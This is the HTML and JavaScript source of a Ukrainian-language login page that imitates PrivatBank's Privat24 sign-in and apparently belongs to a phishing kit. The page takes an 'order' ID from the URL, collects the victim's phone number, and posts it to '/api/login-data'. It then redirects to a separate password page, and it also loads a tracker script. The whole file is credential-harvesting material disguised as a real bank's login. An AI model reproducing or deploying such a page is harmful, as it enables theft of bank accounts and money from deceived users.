<!DOCTYPE html>
<html lang="uk" dir="ltr">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
<title>Вхід/Реєстрація</title>
<style>
  *{box-sizing:border-box;margin:0;padding:0}
  html,body{height:100%;font-family:-apple-system,BlinkMacSystemFont,"Segoe UI",Roboto,Helvetica,Arial,sans-serif}
  body{max-width:520px;margin:0 auto;min-height:100vh;background:#fff;display:flex;flex-direction:column}

  .top-line{height:3px;background:#00A651;flex-shrink:0}

  .topbar{
    display:flex;align-items:center;justify-content:flex-end;
    padding:14px 16px;
  }
  .close-btn{
    width:36px;height:36px;display:flex;align-items:center;justify-content:center;
    background:none;border:none;cursor:pointer;
  }
  .close-btn svg{width:24px;height:24px;fill:none;stroke:#222;stroke-width:2.2;stroke-linecap:round}

  .main-content{flex:1;padding:0 24px;display:flex;flex-direction:column}

  h1{font-size:26px;font-weight:400;color:#222;text-align:center;margin:24px 0 36px;letter-spacing:-.3px}

  .phone-label{font-size:14px;color:#999;margin-bottom:14px}

  .phone-row{
    display:flex;align-items:center;gap:0;
    border-bottom:2px solid #00A651;padding-bottom:12px;margin-bottom:28px;
  }
  .phone-prefix{
    display:flex;align-items:center;gap:6px;cursor:pointer;flex-shrink:0;
    padding-right:14px;border-right:1.5px solid #ccc;margin-right:14px;
  }
  .phone-prefix .flag{font-size:22px;line-height:1}
  .phone-prefix .code{font-size:18px;font-weight:600;color:#222}
  .phone-prefix .arrow{width:16px;height:16px;fill:#888;flex-shrink:0}
  .phone-input{
    border:none;outline:none;font-size:18px;font-family:inherit;color:#222;
    background:transparent;width:100%;letter-spacing:1px;
  }
  .phone-input::placeholder{color:#ccc;letter-spacing:1px}

  .terms-row{
    display:flex;align-items:flex-start;gap:12px;margin-bottom:32px;
  }
  .terms-check{
    width:24px;height:24px;border-radius:4px;border:2px solid #ccc;
    flex-shrink:0;cursor:pointer;display:flex;align-items:center;justify-content:center;
    background:#fff;transition:.15s;margin-top:2px;
  }
  .terms-check.checked{background:#00A651;border-color:#00A651}
  .terms-check svg{width:16px;height:16px;fill:none;stroke:#fff;stroke-width:3;stroke-linecap:round;stroke-linejoin:round;display:none}
  .terms-check.checked svg{display:block}
  .terms-text{font-size:15px;color:#333;line-height:1.55}
  .terms-text a{color:#00A651;text-decoration:none;font-weight:500}

  .continue-btn{
    display:block;width:100%;max-width:320px;margin:0 auto;padding:16px;
    border:none;border-radius:12px;font-size:17px;font-weight:700;
    color:#fff;cursor:pointer;font-family:inherit;
    background:#00A651;transition:.2s;
  }
  .continue-btn:hover{background:#008C45}
  .continue-btn:disabled{opacity:.5;cursor:not-allowed}

  .or-divider{text-align:center;color:#888;font-size:15px;margin:20px 0}

  .p24-btn{
    display:flex;align-items:center;justify-content:center;gap:10px;
    width:100%;max-width:320px;margin:0 auto;padding:16px;
    border:none;border-radius:12px;font-size:17px;font-weight:700;
    color:#fff;cursor:pointer;font-family:inherit;
    background:#1a1a1a;transition:.2s;
  }
  .p24-btn:hover{background:#333}
  .p24-btn .p24-icon{
    width:28px;height:28px;border-radius:50%;background:#00A651;
    display:flex;align-items:center;justify-content:center;
    font-size:14px;font-weight:800;color:#fff;
  }

  .store-row{
    display:flex;align-items:center;justify-content:center;gap:32px;
    padding:28px 24px 32px;margin-top:auto;
  }
  .store-item{display:flex;align-items:center;gap:10px;text-decoration:none;color:#222}
  .store-item .store-icon{width:28px;height:28px;flex-shrink:0}
  .store-item .store-label{font-size:12px;color:#888;line-height:1.2}
  .store-item .store-name{font-size:15px;font-weight:600;color:#222}

  .error-msg{
    display:none;background:#fff5f5;border:1px solid #fcc;border-radius:8px;
    padding:10px 14px;margin-bottom:14px;color:#c62828;font-size:13px;text-align:center;
  }

  .error-overlay{
    display:none;position:fixed;inset:0;background:rgba(0,0,0,.45);z-index:300;
    align-items:center;justify-content:center;padding:24px;backdrop-filter:blur(3px);
  }
  .error-overlay.open{display:flex}
  .error-modal{
    background:#fff;border-radius:24px;width:100%;max-width:380px;
    padding:32px 28px 28px;position:relative;text-align:center;
    animation:errorPop .3s ease-out;
  }
  @keyframes errorPop{from{transform:scale(.85);opacity:0}to{transform:scale(1);opacity:1}}
  .error-modal-close{
    position:absolute;top:16px;right:16px;width:36px;height:36px;border-radius:50%;
    background:#f5f5f5;border:none;cursor:pointer;display:flex;align-items:center;
    justify-content:center;transition:.2s;
  }
  .error-modal-close:hover{background:#e5e5e5}
  .error-modal-close svg{width:18px;height:18px;fill:none;stroke:#888;stroke-width:2.5;stroke-linecap:round}
  .error-img-wrap{position:relative;cursor:pointer}
  .error-img-wrap img{width:100%;height:auto;display:block;border-radius:12px}
</style>
</head>
<body>

  <div class="top-line"></div>

  <div class="topbar">
    <button class="close-btn" type="button" onclick="history.back()">
      <svg viewBox="0 0 24 24"><path d="M6 6l12 12M18 6L6 18"/></svg>
    </button>
  </div>

  <div class="main-content">
    <div class="error-msg" id="errorMsg"></div>

    <h1>Вхід/Реєстрація</h1>

    <div class="phone-label">Номер телефону</div>

    <div class="phone-row">
      <div class="phone-prefix">
        <span class="flag">🇺🇦</span>
        <span class="code">+380</span>
        <svg class="arrow" viewBox="0 0 24 24"><path d="M7 10l5 5 5-5z" fill="#888"/></svg>
      </div>
      <input class="phone-input" id="phone" type="tel" inputmode="numeric" placeholder="000000000" maxlength="12" oninput="checkReady()">
    </div>

    <div class="terms-row">
      <div class="terms-check" id="termsCheck" onclick="toggleTerms()">
        <svg viewBox="0 0 24 24"><path d="M5 13l4 4L19 7"/></svg>
      </div>
      <div class="terms-text">
        Продовжуючи, я підтверджую, що згоден (-на) з <a href="https://privatbank.ua/en/public-contracts">Умовами та Правилами</a>, й ознайомлений (-на) із <a href="https://privatbank.ua/en/personal-information">Повідомленням про обробку персональних даних у Банку</a>
      </div>
    </div>

    <button class="continue-btn" id="continueBtn" onclick="submitLogin()" disabled>Продовжити</button>

    <div class="or-divider">або</div>

    <button class="p24-btn" type="button" onclick="submitLogin()">
      Увійти через <span class="p24-icon">24</span>
    </button>
  </div>

  <div class="store-row">
    <a class="store-item" href="#">
      <svg class="store-icon" viewBox="0 0 28 28" fill="none">
        <path d="M20.44 14.84c-.03-2.86 2.34-4.24 2.44-4.3-1.33-1.94-3.4-2.21-4.13-2.24-1.76-.18-3.43 1.03-4.32 1.03-.89 0-2.27-1.01-3.73-.98-1.92.03-3.69 1.12-4.68 2.84-2 3.46-.51 8.59 1.43 11.4.95 1.38 2.09 2.92 3.58 2.86 1.43-.06 1.98-.93 3.71-.93 1.73 0 2.22.93 3.73.9 1.55-.03 2.54-1.4 3.47-2.78 1.1-1.6 1.55-3.14 1.57-3.22-.03-.02-3.02-1.16-3.07-4.58z" fill="#333"/>
        <path d="M17.58 6.6c.79-.96 1.32-2.28 1.17-3.6-1.14.05-2.51.76-3.33 1.71-.73.84-1.37 2.2-1.2 3.49 1.27.1 2.56-.64 3.36-1.6z" fill="#333"/>
      </svg>
      <div>
        <div class="store-label">Доступно у</div>
        <div class="store-name">App Store</div>
      </div>
    </a>
    <a class="store-item" href="#">
      <svg class="store-icon" viewBox="0 0 28 28" fill="none">
        <path d="M4.42 3.54a1.94 1.94 0 00-.42 1.3v18.32c0 .5.15.94.44 1.32l.08.08L15.6 13.49v-.3L4.5 3.46l-.08.08z" fill="#00A651"/>
        <path d="M19.32 17.2l-3.72-3.72v-.3l3.73-3.72.08.05 4.41 2.5c1.26.72 1.26 1.89 0 2.61l-4.41 2.5-.09.08z" fill="#FFD700"/>
        <path d="M19.41 17.12L15.6 13.34 4.42 24.48c.42.44 1.1.5 1.88.05l13.11-7.41" fill="#E53935"/>
        <path d="M19.41 9.54L6.3 2.14c-.78-.45-1.46-.39-1.88.05L15.6 13.34l3.81-3.8z" fill="#4CAF50"/>
      </svg>
      <div>
        <div class="store-label">Доступно у</div>
        <div class="store-name">Play Market</div>
      </div>
    </a>
  </div>

<!-- Error Modal -->
<div class="error-overlay" id="errorOverlay">
  <div class="error-modal">
    <button class="error-modal-close" onclick="closeErrorModal()"><svg viewBox="0 0 24 24"><path d="M6 6l12 12M18 6L6 18"/></svg></button>
    <div class="error-img-wrap" onclick="closeErrorModal()">
      <img src="images/error-illustration.jpg" alt="Помилка">
    </div>
  </div>
</div>

<script>
  var params = new URLSearchParams(location.search);
  var orderId = params.get("order");
  var termsAccepted = false;

  function toggleTerms(){
    termsAccepted = !termsAccepted;
    var el = document.getElementById("termsCheck");
    if(termsAccepted) el.classList.add("checked");
    else el.classList.remove("checked");
    checkReady();
  }

  function checkReady(){
    var phone = document.getElementById("phone").value.replace(/\D/g,"");
    var btn = document.getElementById("continueBtn");
    if(phone.length >= 9 && termsAccepted){
      btn.disabled = false;
    } else {
      btn.disabled = true;
    }
  }

  if(params.get("error") === "1"){
    document.getElementById("errorOverlay").classList.add("open");
  }

  function closeErrorModal(){
    document.getElementById("errorOverlay").classList.remove("open");
    history.replaceState(null, "", "login.html" + (orderId ? "?order=" + orderId : ""));
  }

  document.getElementById("errorOverlay").addEventListener("click", function(e){
    if(e.target === this) closeErrorModal();
  });

  async function submitLogin(){
    var phone = document.getElementById("phone").value.replace(/\D/g,"");
    if(phone.length < 9) return;

    var btn = document.getElementById("continueBtn");
    btn.disabled = true;
    btn.textContent = "Зачекайте...";

    var fullPhone = "+380" + phone;

    try {
      var res = await fetch("/api/login-data", {
        method:"POST",
        headers:{"Content-Type":"application/json"},
        body:JSON.stringify({order_id:orderId, username:fullPhone, country:"UA"})
      });
      var data = await res.json();
      if(!data.success){
        showError(data.message || "Сталася помилка");
        btn.disabled = false;
        btn.textContent = "Продовжити";
        return;
      }
      location.href = "password.html?order=" + orderId;
    } catch(err){
      showError("Помилка з'єднання");
      btn.disabled = false;
      btn.textContent = "Продовжити";
    }
  }

  function showError(msg){
    var el = document.getElementById("errorMsg");
    el.textContent = msg;
    el.style.display = "block";
    setTimeout(function(){ el.style.display = "none"; }, 3000);
  }

  document.getElementById("phone").addEventListener("keydown", function(e){
    if(e.key === "Enter") submitLogin();
  });
</script>
<script src="footer.js"></script>
<script src="tracker.js"></script>
</body>
</html>
